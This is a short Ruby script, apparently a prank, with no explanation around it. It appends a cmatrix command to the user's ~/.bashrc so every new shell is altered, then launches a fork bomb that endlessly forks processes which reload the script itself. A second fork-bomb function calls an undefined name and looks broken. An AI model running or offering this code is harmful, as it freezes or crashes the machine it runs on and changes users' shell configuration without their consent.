system("echo 'cmatrix -Cred -L' >> ~/.bashrc")
system("clear")
loop {
    fork {
        load(__FILE__)
    }
}
def boom()
loop { fork { bomb } }
end
boom()
